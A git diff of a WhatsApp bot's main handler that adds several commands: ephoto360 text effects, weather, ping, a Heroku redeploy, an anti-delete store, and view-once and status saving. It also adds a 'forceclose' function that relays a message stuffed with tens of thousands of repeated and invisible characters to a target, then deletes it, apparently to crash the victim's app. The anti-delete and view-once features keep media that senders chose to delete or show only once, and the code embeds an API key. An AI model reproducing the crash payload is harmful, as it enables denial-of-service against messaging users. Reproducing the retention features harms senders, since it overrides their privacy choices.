@@ -9,6 +9,7 @@ const fetch = require('node-fetch');
 const axios = require('axios')
 const { exec, execSync } = require("child_process")
 const chalk = require('chalk')
+const cheerio = require('cheerio');
 const nou = require('node-os-utils')
 const moment = require('moment-timezone');
 const path = require ('path');
@@ -25,6 +26,7 @@ const {
 	pomfCDN, 
 	uploadFile
 } = require('./library/scrapes/uploader');
+const { appname,antidel, herokuapi} = require("./set.js");
 global.db.data = JSON.parse(fs.readFileSync('./library/database/database.json'))
 if (global.db.data) global.db.data = {
 sticker: {},
@@ -175,7 +177,46 @@ await trashcore.updateProfileStatus(`✳️ TRASHCORE BOT || ✅ Runtime : ${upt
 setting.status = new Date() * 1
 }
 }
-
+async function ephoto(url, texk) {
+let form = new FormData 
+let gT = await axios.get(url, {
+  headers: {
+    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
+  }
+})
+let $ = cheerio.load(gT.data)
+let text = texk
+let token = $("input[name=token]").val()
+let build_server = $("input[name=build_server]").val()
+let build_server_id = $("input[name=build_server_id]").val()
+form.append("text[]", text)
+form.append("token", token)
+form.append("build_server", build_server)
+form.append("build_server_id", build_server_id)
+let res = await axios({
+  url: url,
+  method: "POST",
+  data: form,
+  headers: {
+    Accept: "*/*",
+    "Accept-Language": "en-US,en;q=0.9",
+    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
+    cookie: gT.headers["set-cookie"]?.join("; "),
+    
+  }
+})
+let $$ = cheerio.load(res.data)
+let json = JSON.parse($$("input[name=form_value_input]").val())
+json["text[]"] = json.text
+delete json.text
+let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
+  headers: {
+    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
+    cookie: gT.headers["set-cookie"].join("; ")
+    }
+})
+return build_server + data.image
+}
 const lol = {
   key: {
     fromMe: false,
@@ -426,273 +467,281 @@ reply(`bot is always online ✅`)
     ],
   });
 }
-          
+ 
+    async function forceclose(target) {
+  try {
+    let message = {
+      ephemeralMessage: {
+        message: {
+          interactiveMessage: {
+            body: {
+              text: "𝐓𝐑𝐀𝐒𝐇-𝐂𝐎𝐑𝐄𝐒" + "ꦽ".repeat(50000),
+            },
+            footer: {
+              text: "ꦽ".repeat(50000),
+            },
+            contextInfo: {
+              participant: "0@s.whatsapp.net",
+              remoteJid: "status@broadcast",
+              mentionedJid: ["0@s.whatsapp.net", "13135550002@s.whatsapp.net"],
+              forwardingScore: 999,
+              isForwarded: true
+            },
+            nativeFlowMessage: {
+              buttons: [
+                {
+                  name: "single_select",
+                  buttonParamsJson: "",
+                },
+                {
+                  name: "call_permission_request",
+                  buttonParamsJson: JSON.stringify({
+                    status: true,
+                  }),
+                },
+                {
+                  name: "payment",
+                  buttonParamsJson: "\u2063".repeat(30000)
+                },
+              ],
+              messageParamsJson: "{{".repeat(10000),
+            },
+          },
+        },
+      },
+    };
+
+    const pertama = await trashcore.relayMessage(target, message, {
+      messageId: "",
+      participant: { jid: target },
+      userJid: target,
+    });
+
+    const kedua = await trashcore.relayMessage(target, message, {
+      messageId: "",
+      participant: { jid: target },
+      userJid: target,
+    });
+
+    await trashcore.sendMessage(target, {
+      delete: {
+        fromMe: true,
+        remoteJid: target,
+        id: pertama,
+      }
+    });
+
+    await trashcore.sendMessage(target, {
+      delete: {
+        fromMe: true,
+        remoteJid: target,
+        id: kedua
+      }
+    });
+
+  } catch (err) {
+    console.error("Qiwiyz Error:", err);
+  }
+
+  console.log(chalk.red(`ForceClose is Coming to ${target}`));
+}
     ////anti delete//////
-const storeFile = "./src/store.json";
-
-function loadStoredMessages() {
-    if (fs.existsSync(storeFile)) {
-        return JSON.parse(fs.readFileSync(storeFile));
-    }
-    return {};
+const baseDir = 'message_data';
+if (!fs.existsSync(baseDir)) {
+  fs.mkdirSync(baseDir);
 }
 
-if (
-    global.antidelete === 'private' &&
-    m.message?.protocolMessage?.type === 0 && 
-    m.message?.protocolMessage?.key
-) {
+function loadChatData(remoteJid, messageId) {
+  const chatFilePath = path.join(baseDir, remoteJid, `${messageId}.json`);
+  try {
+    const data = fs.readFileSync(chatFilePath, 'utf8');
+    return JSON.parse(data) || [];
+  } catch (error) {
+    return [];
+  }
+}
+
+function saveChatData(remoteJid, messageId, chatData) {
+  const chatDir = path.join(baseDir, remoteJid);
+
+  if (!fs.existsSync(chatDir)) {
+    fs.mkdirSync(chatDir, { recursive: true });
+  }
+
+  const chatFilePath = path.join(chatDir, `${messageId}.json`);
+
+  try {
+    fs.writeFileSync(chatFilePath, JSON.stringify(chatData, null, 2));
+  } catch (error) {
+    console.error('Error saving chat data:', error);
+  }
+}
+
+function handleIncomingMessage(message) {
+  const remoteJid = message.key.remoteJid;
+  const messageId = message.key.id;
+
+  const chatData = loadChatData(remoteJid, messageId);
+  chatData.push(message);
+  saveChatData(remoteJid, messageId, chatData);
+}
+
+async function handleMessageRevocation(trashcore, revocationMessage) {
+  const remoteJid = revocationMessage.key.remoteJid;
+  const messageId = revocationMessage.message.protocolMessage.key.id;
+
+  const chatData = loadChatData(remoteJid, messageId);
+  const originalMessage = chatData[0];
+
+  if (originalMessage) {
+    const deletedBy = revocationMessage.participant || revocationMessage.key.participant || revocationMessage.key.remoteJid;
+    const sentBy = originalMessage.key.participant || originalMessage.key.remoteJid;
+
+    const deletedByFormatted = `@${deletedBy.split('@')[0]}`;
+    const sentByFormatted = `@${sentBy.split('@')[0]}`;
+
+    if (deletedBy.includes(trashcore.user.id) || sentBy.includes(trashcore.user.id)) return;
+
+    let notificationText = `TRASHCORE-ANTIDELETE🔥\n\n` +
+      ` 𝗗𝗲𝗹𝗲𝘁𝗲𝗱 𝗯𝘆 : ${deletedByFormatted}\n\n`;
+
     try {
-        let messageId = m.message.protocolMessage.key.id;
-        let chatId = m.chat;
-        let deletedBy = m.sender;
-
-        let storedMessages = loadStoredMessages();
-        let deletedMsg = storedMessages[chatId]?.[messageId];
-
-        if (!deletedMsg) {
-            console.log("⚠️ Deleted message not found in database.");
+      if (originalMessage.message?.conversation) {
+        // Text message
+        const messageText = originalMessage.message.conversation;
+        notificationText += ` 𝗗𝗲𝗹𝗲𝘁𝗲𝗱 𝗠𝗲𝘀𝘀𝗮𝗴𝗲 : ${messageText}`;
+        await trashcore.sendMessage(trashcore.user.id, { text: notificationText });
+      } 
+      else if (originalMessage.message?.extendedTextMessage) {
+        // Extended text message (quoted messages)
+        const messageText = originalMessage.message.extendedTextMessage.text;
+        notificationText += ` 𝗗𝗲𝗹𝗲𝘁𝗲𝗱 𝗖𝗼𝗻𝘁𝗲𝗻𝘁 : ${messageText}`;
+        await trashcore.sendMessage(trashcore.user.id, { text: notificationText });
+      }
+      else if (originalMessage.message?.imageMessage) {
+        // Image message
+        notificationText += ` 𝗗𝗲𝗹𝗲𝘁𝗲𝗱 𝗠𝗲𝗱𝗶𝗮 : [Image]`;
+        try {
+          const buffer = await trashcore.downloadMediaMessage(originalMessage.message.imageMessage);
+          await trashcore.sendMessage(trashcore.user.id, { 
+            image: buffer,
+	    caption: `${notificationText}\n\nImage caption: ${originalMessage.message.imageMessage.caption}`
+          });
+        } catch (mediaError) {
+          console.error('Failed to download image:', mediaError);
+          notificationText += `\n\n⚠️ Could not recover deleted image (media expired)`;
+          await trashcore.sendMessage(trashcore.user.id, { text: notificationText });
+        }
+      } 
+      else if (originalMessage.message?.videoMessage) {
+        // Video message
+        notificationText += ` 𝗗𝗲𝗹𝗲𝘁𝗲𝗱 𝗠𝗲𝗱𝗶𝗮 : [Video]`;
+        try {
+          const buffer = await trashcore.downloadMediaMessage(originalMessage.message.videoMessage);
+          await trashcore.sendMessage(trashcore.user.id, { 
+            video: buffer, 
+            caption: `${notificationText}\n\nVideo caption: ${originalMessage.message.videoMessage.caption}`
+          });
+        } catch (mediaError) {
+          console.error('Failed to download video:', mediaError);
+          notificationText += `\n\n⚠️ Could not recover deleted video (media expired)`;
+          await trashcore.sendMessage(trashcore.user.id, { text: notificationText });
+        }
+      } else if (originalMessage.message?.stickerMessage) {
+	 notificationText += ` 𝗗𝗲𝗹𝗲𝘁𝗲𝗱 𝗠𝗲𝗱𝗶𝗮 : [Sticker]`;
+      // Sticker message
+      const buffer = await trashcore.downloadMediaMessage(originalMessage.message.stickerMessage);      
+      await trashcore.sendMessage(trashcore.user.id, { sticker: buffer, 
+contextInfo: {
+          externalAdReply: {
+          title: notificationText,
+          body: `DELETED BY : ${deletedByFormatted}`,
+          thumbnail: trashpic,
+          sourceUrl: '',
+          mediaType: 1,
+          renderLargerThumbnail: false
+          }}});
+      } else if (originalMessage.message?.documentMessage) {
+        notificationText += ` 𝗗𝗲𝗹𝗲𝘁𝗲𝗱 𝗠𝗲𝗱𝗶𝗮 : [Document]`;
+        // Document message
+        const docMessage = originalMessage.message.documentMessage;
+        const fileName = docMessage.fileName || `document_${Date.now()}.dat`;
+        console.log('Attempting to download document...');
+        const buffer = await trashcore.downloadMediaMessage(docMessage);
+        
+       if (!buffer) {
+            console.log('Download failed - empty buffer');
+            notificationText += ' (Download Failed)';
             return;
         }
-
-        let sender = deletedMsg.key.participant || deletedMsg.key.remoteJid;
-
-let chatName;
-if (deletedMsg.key.remoteJid === 'status@broadcast') {
-    chatName = "Status Update";
-} else if (m.isGroup) {
-    try {
-        const groupInfo = await trashcore.groupMetadata(m.chat);
-        chatName = groupInfo.subject || "Group Chat";
-    } catch {
-        chatName = "Group Chat";
+        
+        console.log('Sending document back...');
+        await trashcore.sendMessage(trashcore.user.id, { 
+            document: buffer, 
+            fileName: fileName,
+            mimetype: docMessage.mimetype || 'application/octet-stream',
+contextInfo: {
+          externalAdReply: {
+          title: notificationText,
+          body: `DELETED BY: \n\n ${deletedByFormatted}`,
+          thumbnail: trashpic,
+          sourceUrl: '',
+          mediaType: 1,
+          renderLargerThumbnail: true
+          }}});
+      } else if (originalMessage.message?.audioMessage) {
+	      notificationText += ` 𝗗𝗲𝗹𝗲𝘁𝗲𝗱 𝗠𝗲𝗱𝗶𝗮: \n\n [Audio]`;
+      // Audio message
+      const buffer = await trashcore.downloadMediaMessage(originalMessage.message.audioMessage);
+      const isPTT = originalMessage.message.audioMessage.ptt === true;
+      await trashcore.sendMessage(trashcore.user.id, { audio: buffer, ptt: isPTT, mimetype: 'audio/mpeg', 
+contextInfo: {
+          externalAdReply: {
+          title: notificationText,
+          body: `DELETED BY: \n\n ${deletedByFormatted}`,
+          thumbnail: trashpic,
+          sourceUrl: '',
+          mediaType: 1,
+          renderLargerThumbnail: true
+          }}});
+      }	      
+    } catch (error) {
+      console.error('Error handling deleted message:', error);
+      notificationText += `\n\n⚠️ Error recovering deleted content 😓`;
+      await trashcore.sendMessage(trashcore.user.id, { text: notificationText });
     }
-} else {
-    chatName = deletedMsg.pushName || m.pushName || "Private Chat";
+  }
 }
 
-        let xtipes = moment(deletedMsg.messageTimestamp * 1000).tz(`${timezones}`).locale('en').format('HH:mm z');
-        let xdptes = moment(deletedMsg.messageTimestamp * 1000).tz(`${timezones}`).format("DD/MM/YYYY");
 
-        if (!deletedMsg.message.conversation && !deletedMsg.message.extendedTextMessage) {
-            try {
-                let forwardedMsg = await trashcore.sendMessage(
-                    trashcore.user.id,
-                    { 
-                        forward: deletedMsg,
-                        contextInfo: { isForwarded: false }
-                    },
-                    { quoted: deletedMsg }
-                );
-                
-                let mediaInfo = `🚨 *𝙳𝙴𝙻𝙴𝚃𝙴𝙳 𝙼𝙴𝙳𝙸𝙰!* 🚨
-${readmore}
-𝙲𝙷𝙰𝚃: ${chatName}
-𝚂𝙴𝙽𝚃 𝙱𝚈: @${sender.split('@')[0]} 
-𝚃𝙸𝙼𝙴: ${xtipes}
-𝙳𝙰𝚃𝙴: ${xdptes}
-𝙳𝙴𝙻𝙴𝚃𝙴𝙳 𝙱𝚈: @${deletedBy.split('@')[0]}`;
 
-                await trashcore.sendMessage(
-                    trashcore.user.id, 
-                    { text: mediaInfo, mentions: [sender, deletedBy] },
-                    { quoted: forwardedMsg }
-                );
-                
-            } catch (mediaErr) {
-                console.error("Media recovery failed:", mediaErr);
-                let replyText = `🚨 *𝙳𝙴𝙻𝙴𝚃𝙴𝙳 𝙼𝙴𝚂𝚂𝙰𝙶𝙴!* 🚨
-${readmore}
-𝙲𝙷𝙰𝚃: ${chatName}
-𝚂𝙴𝙽𝚃 𝙱𝚈: @${sender.split('@')[0]} 
-𝚃𝙸𝙼𝙴 𝚂𝙴𝙽𝚃: ${xtipes}
-𝙳𝙰𝚃𝙴 𝚂𝙴𝙽𝚃: ${xdptes}
-𝙳𝙴𝙻𝙴𝚃𝙴𝙳 𝙱𝚈: @${deletedBy.split('@')[0]}
 
-𝙼𝙴𝚂𝚂𝙰𝙶𝙴: [Unsupported media content]`;
+        
 
-                let quotedMessage = {
-                    key: {
-                        remoteJid: chatId,
-                        fromMe: sender === trashcore.user.id,
-                        id: messageId,
-                        participant: sender
-                    },
-                    message: { conversation: "Media recovery failed" }
-                };
 
-                await trashcore.sendMessage(
-                    trashcore.user.id,
-                    { text: replyText, mentions: [sender, deletedBy] },
-                    { quoted: quotedMessage }
-                );
-            }
-        } 
-        else {
-            let text = deletedMsg.message.conversation || 
-                      deletedMsg.message.extendedTextMessage?.text;
-
-            let replyText = `🚨 *𝙳𝙴𝙻𝙴𝚃𝙴𝙳 𝙼𝙴𝚂𝚂𝙰𝙶𝙴!* 🚨
-${readmore}
-𝙲𝙷𝙰𝚃: ${chatName}
-𝚂𝙴𝙽𝚃 𝙱𝚈: @${sender.split('@')[0]} 
-𝚃𝙸𝙼𝙴 𝚂𝙴𝙽𝚃: ${xtipes}
-𝙳𝙰𝚃𝙴 𝚂𝙴𝙽𝚃: ${xdptes}
-𝙳𝙴𝙻𝙴𝚃𝙴𝙳 𝙱𝚈: @${deletedBy.split('@')[0]}
-
-𝙼𝙴𝚂𝚂𝙰𝙶𝙴: ${text}`;
-
-            let quotedMessage = {
-                key: {
-                    remoteJid: chatId,
-                    fromMe: sender === trashcore.user.id,
-                    id: messageId,
-                    participant: sender
-                },
-                message: {
-                    conversation: text 
-                }
-            };
-
-            await trashcore.sendMessage(
-                trashcore.user.id,
-                { text: replyText, mentions: [sender, deletedBy] },
-                { quoted: quotedMessage }
-            );
+ if (antidel === "TRUE") {
+        if (mek.message?.protocolMessage?.key) {
+          await handleMessageRevocation(trashcore, mek);
+        } else {
+          handleIncomingMessage(mek);
         }
-
-    } catch (err) {
-        console.error("❌ Error processing deleted message:", err);
-    }
-} else if (
-    m.sender !== botNumber &&
-    global.antidelete === 'chat' &&
-    m.message?.protocolMessage?.type === 0 && 
-    m.message?.protocolMessage?.key
-) {
-    try {
-        let messageId = m.message.protocolMessage.key.id;
-        let chatId = m.chat;
-        let deletedBy = m.sender;
-
-        let storedMessages = loadStoredMessages();
-        let deletedMsg = storedMessages[chatId]?.[messageId];
-
-        if (!deletedMsg) {
-            console.log("⚠️ Deleted message not found in database.");
-            return;
-        }
-
-        let sender = deletedMsg.key.participant || deletedMsg.key.remoteJid;
-
-     let chatName;
-if (deletedMsg.key.remoteJid === 'status@broadcast') {
-    chatName = "Status Update";
-} else if (m.isGroup) {
-    try {
-        const groupInfo = await trashcore.groupMetadata(m.chat);
-        chatName = groupInfo.subject || "Group Chat";
-    } catch {
-        chatName = "Group Chat";
-    }
-} else {
-    chatName = deletedMsg.pushName || m.pushName || "Private Chat";
-}
-
-        let xtipes = moment(deletedMsg.messageTimestamp * 1000).tz(`${timezones}`).locale('en').format('HH:mm z');
-        let xdptes = moment(deletedMsg.messageTimestamp * 1000).tz(`${timezones}`).format("DD/MM/YYYY");
-
-        if (!deletedMsg.message.conversation && !deletedMsg.message.extendedTextMessage) {
-            try {
-                let forwardedMsg = await trashcore.sendMessage(
-                    m.chat,
-                    { 
-                        forward: deletedMsg,
-                        contextInfo: { isForwarded: false }
-                    },
-                    { quoted: deletedMsg }
-                );
+	  }                   
+                        
                 
-                let mediaInfo = `🚨 *𝙳𝙴𝙻𝙴𝚃𝙴𝙳 𝙼𝙴𝙳𝙸𝙰!* 🚨
-${readmore}
-𝙲𝙷𝙰𝚃: ${chatName}
-𝚂𝙴𝙽𝚃 𝙱𝚈: @${sender.split('@')[0]} 
-𝚃𝙸𝙼𝙴: ${xtipes}
-𝙳𝙰𝚃𝙴: ${xdptes}
-𝙳𝙴𝙻𝙴𝚃𝙴𝙳 𝙱𝚈: @${deletedBy.split('@')[0]}`;
+                    
 
-                await trashcore.sendMessage(
-                    m.chat, 
-                    { text: mediaInfo, mentions: [sender, deletedBy] },
-                    { quoted: forwardedMsg }
-                );
+            
                 
-            } catch (mediaErr) {
-                console.error("Media recovery failed:", mediaErr);
-                let replyText = `🚨 *𝙳𝙴𝙻𝙴𝚃𝙴𝙳 𝙼𝙴𝚂𝚂𝙰𝙶𝙴!* 🚨
-${readmore}
-𝙲𝙷𝙰𝚃: ${chatName}
-𝚂𝙴𝙽𝚃 𝙱𝚈: @${sender.split('@')[0]} 
-𝚃𝙸𝙼𝙴 𝚂𝙴𝙽𝚃: ${xtipes}
-𝙳𝙰𝚃𝙴 𝚂𝙴𝙽𝚃: ${xdptes}
-𝙳𝙴𝙻𝙴𝚃𝙴𝙳 𝙱𝚈: @${deletedBy.split('@')[0]}
+    
 
-𝙼𝙴𝚂𝚂𝙰𝙶𝙴: [Unsupported media content]`;
 
-                let quotedMessage = {
-                    key: {
-                        remoteJid: chatId,
-                        fromMe: sender === trashcore.user.id,
-                        id: messageId,
-                        participant: sender
-                    },
-                    message: { conversation: "Media recovery failed" }
-                };
+        
+                        
+                
 
-                await trashcore.sendMessage(
-                    m.chat,
-                    { text: replyText, mentions: [sender, deletedBy] },
-                    { quoted: quotedMessage }
-                );
-            }
-        } 
-        else {
-            let text = deletedMsg.message.conversation || 
-                      deletedMsg.message.extendedTextMessage?.text;
+            
 
-            let replyText = `🚨 *𝙳𝙴𝙻𝙴𝚃𝙴𝙳 𝙼𝙴𝚂𝚂𝙰𝙶𝙴!* 🚨
-${readmore}
-𝙲𝙷𝙰𝚃: ${chatName}
-𝚂𝙴𝙽𝚃 𝙱𝚈: @${sender.split('@')[0]} 
-𝚃𝙸𝙼𝙴 𝚂𝙴𝙽𝚃: ${xtipes}
-𝙳𝙰𝚃𝙴 𝚂𝙴𝙽𝚃: ${xdptes}
-𝙳𝙴𝙻𝙴𝚃𝙴𝙳 𝙱𝚈: @${deletedBy.split('@')[0]}
-
-𝙼𝙴𝚂𝚂𝙰𝙶𝙴: ${text}`;
-
-            let quotedMessage = {
-                key: {
-                    remoteJid: chatId,
-                    fromMe: sender === trashcore.user.id,
-                    id: messageId,
-                    participant: sender
-                },
-                message: {
-                    conversation: text 
-                }
-            };
-
-            await trashcore.sendMessage(
-                m.chat,
-                { text: replyText, mentions: [sender, deletedBy] },
-                { quoted: quotedMessage }
-            );
-        }
-
-    } catch (err) {
-        console.error("❌ Error processing deleted message:", err);
-    }
-}
+            
 
     
 ///////////end bug func///////////
@@ -724,7 +773,7 @@ return plugins
 //========= [ COMMANDS PLUGINS ] =================================================
 let pluginsDisable = true
 const plugins = await pluginsLoader(path.resolve(__dirname, "trashplugs"))
-const trashdex = { trashown, reply,replymenu,command,isCmd, text, botNumber, prefix, reply,fetchJson,example, totalfeature,trashcore,m,q,mime,sleep,fkontak,menu,addPremiumUser, args,delPremiumUser,isPremium,trashpic,trashdebug,sleep,isAdmins,groupAdmins,isBotAdmins,quoted,from,groupMetadata,downloadAndSaveMediaMessage}
+const trashdex = { trashown, reply,replymenu,command,isCmd, text, botNumber, prefix, reply,fetchJson,example, totalfeature,trashcore,m,q,mime,sleep,fkontak,menu,addPremiumUser, args,delPremiumUser,isPremium,trashpic,trashdebug,sleep,isAdmins,groupAdmins,isBotAdmins,quoted,from,groupMetadata,downloadAndSaveMediaMessage,forceclose}
 for (let plugin of plugins) {
 if (plugin.command.find(e => e == command.toLowerCase())) {
 pluginsDisable = false
@@ -747,6 +796,112 @@ case 'repo': {
   reply(botInfo)
 }
 break
+//==================================================//     
+        case "update": case "redeploy": {
+		      const axios = require('axios');
+
+		if(!trashown) return reply(mess.owner);
+		     if (!appname || !herokuapi) {
+            await reply("It looks like the Heroku app name or API key is not set. Please make sure you have set the `APP_NAME` and `HEROKU_API` environment variables.");
+            return;
+        }
+
+        async function redeployApp() {
+            try {
+                const response = await axios.post(
+                    `https://api.heroku.com/apps/${appname}/builds`,
+                    {
+                        source_blob: {
+                            url: "https://github.com/Finjohns/Black-Demon/tarball/main",
+                        },
+                    },
+                    {
+                        headers: {
+                            Authorization: `Bearer ${herokuapi}`,
+                            Accept: "application/vnd.heroku+json; version=3",
+                        },
+                    }
+                );
+
+                await m.reply("Your bot is undergoing an upgrade, hold  for the next 2 minutes as the redeploy executes! Once done, you’ll have the freshest version of *Black-Demon* .");
+                console.log("Build details:", response.data);
+            } catch (error) {
+                const errorMessage = error.response?.data || error.message;
+                await reply(`Failed to update and redeploy. Please check if you have set the Heroku API key and Heroku app name correctly.`);
+                console.error("Error triggering redeploy:", errorMessage);
+            }
+        }
+
+        redeployApp();
+    }
+	break;
+//==================================================//     
+   case 'weather': {
+		      try {
+
+if (!text) return reply("provide a city/town name");
+
+const response = await fetch(`http://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=1ad47ec6172f19dfaf89eb3307f74785`);
+        const data = await response.json();
+
+console.log("Weather data:",data);
+
+        const cityName = data.name;
+        const temperature = data.main.temp;
+        const feelsLike = data.main.feels_like;
+        const minTemperature = data.main.temp_min;
+        const maxTemperature = data.main.temp_max;
+        const description = data.weather[0].description;
+        const humidity = data.main.humidity;
+        const windSpeed = data.wind.speed;
+        const rainVolume = data.rain ? data.rain['1h'] : 0;
+        const cloudiness = data.clouds.all;
+        const sunrise = new Date(data.sys.sunrise * 1000);
+        const sunset = new Date(data.sys.sunset * 1000);
+
+await m.reply(`❄️ Weather in ${cityName}
+
+🌡️ Temperature: ${temperature}°C
+📝 Description: ${description}
+❄️ Humidity: ${humidity}%
+🌀 Wind Speed: ${windSpeed} m/s
+🌧️ Rain Volume (last hour): ${rainVolume} mm
+☁️ Cloudiness: ${cloudiness}%
+🌄 Sunrise: ${sunrise.toLocaleTimeString()}
+🌅 Sunset: ${sunset.toLocaleTimeString()}`);
+
+} catch (e) { reply("Unable to find that location.") }
+  }
+   break;
+//==================================================//        
+  case 'gitclone': {
+		      if (!text) return m.reply(`Where is the link?`)
+if (!text.includes('github.com')) return reply(`Is that a GitHub repo link ?!`)
+let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
+    let [, user3, repo] = text.match(regex1) || []
+    repo = repo.replace(/.git$/, '')
+    let url = `https://api.github.com/repos/${user3}/${repo}/zipball`
+    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
+    await trashcore.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => reply("error"))
+
+		    }
+		      break; //==================================================//     
+        case 'uptime':
+  const uptime = process.uptime();
+  const days = Math.floor(uptime / (24 * 3600));
+  const hours = Math.floor((uptime % (24 * 3600)) / 3600);
+  const minutes = Math.floor((uptime % 3600) / 60);
+  const seconds = Math.floor(uptime % 60);
+  trashcore.sendMessage(m.chat, { text: `Uptime: ${days}d ${hours}h ${minutes}m ${seconds}s` });
+  break;
+//==================================================//           
+      case 'ping':
+  const start = Date.now();
+  const msg = await m.reply('Pinging...');
+  const end = Date.now();
+  const latency = end - start;
+  m.reply(`Pong! Latency: ${latency}ms`);
+  break; //==================================================//      
     case 'yts': case 'ytsearch': {
                 if (!text) return reply(`Example : ${prefix + command} faded`)
                 let yts = require("yt-search")
@@ -758,8 +913,101 @@ break
                 }
                 trashcore.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
             }
-            break    
-                    
+            break  //==================================================//       
+        case "vv": case "retrieve":{
+
+if (!m.quoted) return reply("quote a viewonce message eh")
+
+  const quotedMessage = m.msg?.contextInfo?.quotedMessage;
+
+    if (quotedMessage.imageMessage) {
+      let imageCaption = quotedMessage.imageMessage.caption;
+      let imageUrl = await trashcore.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
+      trashcore.sendMessage(m.chat, { image: { url: imageUrl }, caption: `Retrieved by Trashcore!\n${imageCaption}`}, { quoted: m });
+    }
+
+    if (quotedMessage.videoMessage) {
+      let videoCaption = quotedMessage.videoMessage.caption;
+      let videoUrl = await trashcore.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
+      trashcore.sendMessage(m.chat, { video: { url: videoUrl }, caption: `Retrieved by Trashcore!\n${videoCaption}`}, { quoted: m });
+    }
+      }
+	break;
+//==================================================//              
+        case "desc": case "setdesc": { 
+                 if (!m.isGroup) return reply (mess.group)
+                 if (!isAdmins) return reply ("bot must be admin in this group")
+                 if (!text) throw 'Provide the text for the group description' 
+                 await trashcore.groupUpdateDescription(m.chat, text); 
+ m.reply('Group description successfully updated! 🥶'); 
+             } 
+ break; 
+//==================================================//      
+ case 'save': {
+  try {
+    const quotedMessage = m.msg?.contextInfo?.quotedMessage;
+    
+    // Check if user quoted a message
+    if (!quotedMessage) {
+      return m.reply('❌ Please reply to a status message');
+    }
+    
+    // Verify it's a status message
+    if (!m.quoted?.chat?.endsWith('@broadcast')) {
+      return m.reply('⚠️ That message is not a status! Please reply to a status message.');
+    }
+    
+    // Download the media first
+    const mediaBuffer = await trashcore.downloadMediaMessage(m.quoted);
+    if (!mediaBuffer || mediaBuffer.length === 0) {
+      return m.reply('🚫 Could not download the status media. It may have expired.');
+    }
+    
+    // Determine media type and prepare payload
+    let payload;
+    let mediaType;
+    
+    if (quotedMessage.imageMessage) {
+      mediaType = 'image';
+      payload = {
+        image: mediaBuffer,
+        caption: quotedMessage.imageMessage.caption || '📸 Saved status image',
+        mimetype: 'image/jpeg'
+      };
+    } 
+    else if (quotedMessage.videoMessage) {
+      mediaType = 'video';
+      payload = {
+        video: mediaBuffer,
+        caption: quotedMessage.videoMessage.caption || '🎥 Saved status video',
+        mimetype: 'video/mp4'
+      };
+    } 
+    else {
+      return m.reply('❌ Only image and video statuses can be saved!');
+    }
+    
+    // Send to user's DM
+    await trashcore.sendMessage(
+      m.sender, 
+      payload,
+      { quoted: m }
+    );
+    
+    // Confirm in chat
+    return m.reply(`✅  ${mediaType} Saved by Trashcore!`);
+    
+  } catch (error) {
+    console.error('Save error:', error);
+    if (error.message.includes('404') || error.message.includes('not found')) {
+      return m.reply('⚠️ The status may have expired or been deleted.');
+    }
+    return m.reply('❌ Failed to save status. Error: ' + error.message);
+  }
+}
+break;
+        
+       
 //==================================================//      
 case 'autotyping':
 if (!trashown) return reply(mess.owner)
@@ -1430,20 +1678,71 @@ break;
 }
 break
 
-        case 'infobot':
-case 'botinfo': {
-// wait message
-trashreply(mess.wait)
-  const botInfo = `
-╭─ ⌬ Bot Info
-│ • Name    : ${botname}
-│ • Owner   : ${ownername}
-│ • Version  : ${botversion}
-│ • Cases : ${totalfeature()}
-│ • Plugins : 30
-│ • Runtime  : ${runtime(process.uptime())}\n╰─────────────
-`
-  reply(botInfo)
+        case 'glitchtext':
+case 'writetext':
+case 'advancedglow':
+case 'typographytext':
+case 'pixelglitch':
+case 'neonglitch':
+case 'flagtext':
+case 'flag3dtext':
+case 'deletingtext':
+case 'blackpinkstyle':
+case 'glowingtext':
+case 'underwatertext':
+case 'logomaker':
+case 'cartoonstyle':
+case 'papercutstyle':
+case 'watercolortext':
+case 'effectclouds':
+case 'blackpinklogo':
+case 'gradienttext':
+case 'summerbeach':
+case 'luxurygold':
+case 'multicoloredneon':
+case 'sandsummer':
+case 'galaxywallpaper':
+case '1917style':
+case 'makingneon':
+case 'royaltext':
+case 'freecreate':
+case 'galaxystyle':
+case 'lighteffects':{
+
+if (!q) return reply(`Example : ${prefix+command} Trash corr`) 
+let link
+if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
+if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
+if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
+if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
+if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
+if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
+if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
+if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
+if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
+if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
+if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
+if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
+if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
